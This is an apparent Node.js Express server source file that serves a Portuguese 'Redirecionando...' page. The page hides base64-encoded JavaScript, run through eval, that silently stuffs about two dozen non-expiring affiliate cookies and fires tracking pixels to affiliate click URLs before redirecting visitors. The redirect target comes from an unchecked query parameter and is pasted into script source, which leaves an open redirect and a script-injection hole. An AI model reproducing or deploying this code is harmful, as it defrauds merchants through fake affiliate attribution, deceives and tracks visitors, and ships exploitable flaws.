import express from 'express';
const app = express();

const affiliatePrograms = [
    { cookie: 'affiliateId=67c5f4e32bfa81404d19633b', pixel: 'https://apretailer.com.br/click/67c5f4e32bfa81404d19633b/173434/351733/subaccount' },
    { cookie: 'affiliateId=67c5f79a2bfa810f7f6a5812', pixel: 'https://apretailer.com.br/click/67c5f79a2bfa810f7f6a5812/185722/351733/subaccount' },
    { cookie: 'affiliateId=67c5fbdb2bfa814c9c7aebc6', pixel: 'https://apretailer.com.br/click/67c5fbdb2bfa814c9c7aebc6/183857/351733/subaccount' },
    { cookie: 'affiliateId=67c5ff6d2bfa814ca2393465', pixel: 'https://apretailer.com.br/click/67c5ff6d2bfa814ca2393465/171961/351733/subaccount' },
    { cookie: 'affiliateId=67c606f82bfa816ce81112a1', pixel: 'https://apyecom.com/click/67c606f82bfa816ce81112a1/183685/351733/subaccount' },
    { cookie: 'affiliateId=67c60a002bfa81599d37d555', pixel: 'https://apretailer.com.br/click/67c60a002bfa81599d37d555/180444/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6db8', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6db8/163410/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd62bfa81773b7c6daf', pixel: 'https://apyoth.com/click/67c60cd62bfa81773b7c6daf/164918/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6db9', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6db9/163408/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dc0', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dc0/183697/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dba', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dba/167529/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd62bfa81773b7c6dad', pixel: 'https://apyoth.com/click/67c60cd62bfa81773b7c6dad/142433/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dbf', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dbf/142432/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dbe', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dbe/185332/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dbb', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dbb/167545/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6db7', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6db7/163406/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd62bfa81773b7c6dab', pixel: 'https://apyoth.com/click/67c60cd62bfa81773b7c6dab/163407/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd62bfa81773b7c6dae', pixel: 'https://apyoth.com/click/67c60cd62bfa81773b7c6dae/142434/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dc1', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dc1/186321/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dbd', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dbd/181874/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dbc', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dbc/171291/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd62bfa81773b7c6dac', pixel: 'https://apyoth.com/click/67c60cd62bfa81773b7c6dac/163409/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6db6', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6db6/185647/351733/subaccount' },
    { cookie: 'affiliateId=67c60cd72bfa81773b7c6dc2', pixel: 'https://apyoth.com/click/67c60cd72bfa81773b7c6dc2/351733/subaccount/url=example.com' }
];

function isValidUrl(string) {
    try {
        const url = new URL(string);
        return url.protocol === 'http:' || url.protocol === 'https:';
    } catch (_) {
        return false;
    }
}

app.get('/', (req, res) => {
    const rawRedirectUrl = req.query.url || 'https://google.com';
    const redirectUrl = isValidUrl(rawRedirectUrl) ? rawRedirectUrl : 'https://google.com';
    console.log(`Redirecionando para: ${redirectUrl}`);
    const script = btoa(`
        if (!localStorage.getItem('affiliateExecuted')) {
            const affiliates = ${JSON.stringify(affiliatePrograms)};
            affiliates.forEach(aff => {
                document.cookie = aff.cookie + "; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT";
                var pixel = new Image();
                pixel.src = aff.pixel;
            });
            localStorage.setItem('affiliateExecuted', 'true');
        }
        setTimeout(() => {
            window.location.href = "${decodeURIComponent(redirectUrl)}";
        }, Math.floor(Math.random() * 1000) + 500);
    `);
    const html = `
    <!DOCTYPE html>
    <html>
    <head><title>Redirecionando...</title></head>
    <body>
        <script>eval(atob("${script}"));</script>
    </body>
    </html>
    `;
    res.send(html.replace('gsite', 'gsite'));
});

const port = process.env.PORT || 8080;
app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
});

export default app;
